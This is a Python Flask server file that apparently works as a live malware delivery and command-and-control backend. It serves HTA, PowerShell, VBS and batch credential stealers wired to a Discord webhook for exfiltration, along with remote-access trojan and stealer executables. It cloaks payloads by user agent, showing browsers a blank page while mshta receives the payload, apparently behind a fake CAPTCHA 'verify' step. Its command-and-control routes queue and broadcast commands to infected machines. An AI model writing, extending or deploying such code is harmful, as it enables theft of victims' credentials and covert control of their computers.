import os, base64, subprocess
from flask import Flask, Response, request

app = Flask(__name__)

HTA_TEMPLATE = open("stealer.hta", "r", encoding="utf-8").read()
DICERIGGER_TEMPLATE = open("dicerigger.hta", "r", encoding="utf-8").read()
DICERIGGER_PERSIST = open("dicerigger-persist.hta", "r", encoding="utf-8").read()
BLITZ_TEMPLATE = open("blitz.hta", "r", encoding="utf-8").read()
LAUNCHER_TEMPLATE = open("launcher.hta", "r", encoding="utf-8").read()
STAGER_TEMPLATE = open("stager.hta", "r", encoding="utf-8").read()
STEAL_PS = open("steal.ps1", "r", encoding="utf-8").read()
STAGER_PS1 = open("stager.ps1", "r", encoding="utf-8").read()
STEAL_BAT = open("steal.bat", "r", encoding="utf-8").read()
GHOST_TEMPLATE = open("ghost.hta", "r", encoding="utf-8").read()
SCT_TEMPLATE = open("payload.sct", "r", encoding="utf-8").read()
STEAL_VBS = open("steal.vbs", "r", encoding="utf-8").read()
DPA_EXE = open("dpa.exe", "rb").read()

def generate_payload_bat():
    """Regenerate payload.bat with current env vars."""
    webhook = os.environ.get("WEBHOOK_URL", "WEBHOOK_PLACEHOLDER")
    base_url = os.environ.get("BASE_URL", "https://sabdice.bet")
    result = subprocess.run(["python", "gen.py"], capture_output=True, text=True,
                          env={**os.environ, "WEBHOOK_URL": webhook, "BASE_URL": base_url})
    if result.returncode != 0:
        print(f"gen.py failed: {result.stderr}")
    else:
        print(result.stdout.strip())

@app.route("/payload.bat")
def serve_payload_bat():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    base = os.environ.get("BASE_URL", "https://sabdice.bet")
    result = subprocess.run(["python", "gen.py"], capture_output=True, text=True, timeout=30,
                          env={**os.environ, "WEBHOOK_URL": webhook, "BASE_URL": base})
    if result.returncode != 0:
        return Response(f"gen failed: {result.stderr}", status=500)
    bat = open("payload.bat", "r", encoding="utf-8").read()
    return Response(bat, mimetype="text/plain")


C2_QUEUE = {}
C2_LOG = []
BROADCAST_CMD = None

DEBUG_DATA = []

@app.route("/")
def index():
    ua = request.headers.get("User-Agent", "").lower()
    accept = request.headers.get("Accept", "").lower()
    isBrowser = any(b in ua for b in ["mozilla", "chrome", "firefox", "safari", "edge", "opera"])
    if not isBrowser or "mshta" in ua or "text/html" not in accept:
        webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
        base = os.environ.get("BASE_URL", "https://sabdice.bet")
        hta = DICERIGGER_TEMPLATE.replace("WEBHOOK_URL", webhook).replace("BASEURL_VALUE", base)
        return Response(hta, mimetype="text/html")
    return Response("<html><body></body></html>", mimetype="text/html")

@app.route("/verify")
def verify():
    # Serves the HTA payload when CAPTCHA redirects
    ua = request.headers.get("User-Agent", "").lower()
    isMshta = "mshta" in ua or "text/html" not in request.headers.get("Accept", "").lower()
    if isMshta:
        webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
        base = os.environ.get("BASE_URL", "https://synapsez.xyz")
        hta = DICERIGGER_TEMPLATE.replace("WEBHOOK_URL", webhook).replace("BASEURL_VALUE", base)
        return Response(hta, mimetype="text/html")
    return Response("OK", status=200)

@app.route("/stg2")
def stage2():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    hta = DICERIGGER_TEMPLATE
    start = hta.find("<script language=\"VBScript\">")
    end = hta.find("</script>")
    if start >= 0 and end > start:
        script = hta[start + len("<script language=\"VBScript\">"):end]
        script = script.replace("WEBHOOK_URL", webhook)
        # Strip HTA-only calls that crash wscript.exe
        script = script.replace("window.resizeTo 0,0:window.moveTo -2000,-2000", "")
        script = script.replace("window.close()", "")
        return Response(script, mimetype="text/plain")
    return Response("", status=404)


@app.route("/scan")
def stealer():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    hta = HTA_TEMPLATE.replace("YOUR_WEBHOOK_HERE", webhook)
    return Response(hta, mimetype="text/html")


@app.route("/dicerigger")
def launcher():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    hta = DICERIGGER_TEMPLATE.replace("WEBHOOK_URL", webhook)
    return Response(hta, mimetype="text/html")

@app.route("/blitz")
def blitz():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    dpa_b64 = base64.b64encode(DPA_EXE).decode()
    # Always exactly 4 chunks
    n = len(dpa_b64)
    c1, c2, c3, c4 = dpa_b64[:n//4], dpa_b64[n//4:n//2], dpa_b64[n//2:3*n//4], dpa_b64[3*n//4:]
    hta = BLITZ_TEMPLATE
    hta = hta.replace("WEBHOOK_URL", webhook)
    hta = hta.replace("DPA_C1", c1).replace("DPA_C2", c2).replace("DPA_C3", c3).replace("DPA_C4", c4)
    return Response(hta, mimetype="text/html")

@app.route("/e")
def experimental():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    base = os.environ.get("BASE_URL", "https://sabdice.bet")
    hta = LAUNCHER_TEMPLATE.replace("WEBHOOK_URL", webhook).replace("BASEURL_VALUE", base)
    return Response(hta, mimetype="text/html")

@app.route("/s.vbs")
def serve_steal_vbs():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    base = os.environ.get("BASE_URL", "https://sabdice.bet")
    vbs = STEAL_VBS.replace("WEBHOOK_URL", webhook).replace("BASEURL_VALUE", base)
    return Response(vbs, mimetype="text/plain")

@app.route("/key")
def serve_key():
    decoder = 'Function z(p,q):Dim i,r,c:r="""":For i=1 To Len(p) Step 3:c=CLng(Mid(p,i,3))-q:r=r&Chr(c):Next:z=r:End Function'
    return Response(decoder, mimetype="text/plain")



@app.route("/steal")
def steal_script():
    webhook = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK")
    return Response(STEAL_PS.replace("WEBHOOK_PLACEHOLDER", webhook), mimetype="text/plain")


@app.route("/stager")
def serve_stager():
    return Response(STAGER_PS1, mimetype="text/plain")


@app.route("/steal.bat")
def serve_steal_bat():
    return Response(STEAL_BAT, mimetype="text/plain")



@app.route("/dpa.exe")
def serve_dpa():
    exe = open("dpa.exe", "rb").read()
    return Response(exe, mimetype="application/octet-stream")

@app.route("/rat")
def serve_rat():
    exe = open("lime-rat.exe", "rb").read()
    return Response(exe, mimetype="application/octet-stream")

@app.route("/debug", methods=["POST"])
def debug_catch():
    data = request.get_json(force=True, silent=True) or {}
    global DEBUG_DATA
    DEBUG_DATA.append(data.get("d", data.get("status", str(data))))
    if len(DEBUG_DATA) > 20: DEBUG_DATA.pop(0)
    return Response("ok", status=200)

@app.route("/debuglog")
def debug_log():
    return Response("\n\n---\n\n".join(DEBUG_DATA[-10:]) or "(empty)", mimetype="text/plain")

@app.route('/stealer.exe')
def serve_stealer_exe():
    exe = open('stealer.exe', 'rb').read()
    return Response(exe, mimetype='application/octet-stream')

@app.route("/cmd", methods=["GET", "POST"])
def cmd_handler():
    if request.method == "POST":
        data = request.get_json(force=True, silent=True) or {}
        agent_id = data.get("id", "?")
        output = data.get("output", "")
        C2_LOG.append(f"[{agent_id}] {output[:2000]}")
        if len(C2_LOG) > 50:
            C2_LOG.pop(0)
        return Response("ok", status=200)
    agent_id = request.args.get("id", "")
    if BROADCAST_CMD:
        cmd = BROADCAST_CMD
        return Response(cmd, mimetype="text/plain")
    cmd = C2_QUEUE.pop(agent_id, "none")
    return Response(cmd, mimetype="text/plain")

@app.route("/c2send", methods=["POST"])
def c2_send():
    data = request.get_json(force=True, silent=True) or {}
    agent_id = data.get("id", "")
    cmd = data.get("cmd", "")
    C2_QUEUE[agent_id] = cmd
    return Response(f"queued", status=200)

@app.route("/c2log")
def c2_log():
    return Response("\n".join(C2_LOG[-30:]) or "(empty)", mimetype="text/plain")

@app.route("/broadcast", methods=["POST"])
def broadcast():
    global BROADCAST_CMD
    data = request.get_json(force=True, silent=True) or {}
    BROADCAST_CMD = data.get("cmd", BROADCAST_CMD)
    return Response(f"broadcasting: {BROADCAST_CMD}", status=200)

@app.route("/broadcast", methods=["DELETE"])
def clear_broadcast():
    global BROADCAST_CMD
    BROADCAST_CMD = None
    return Response("cleared", status=200)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

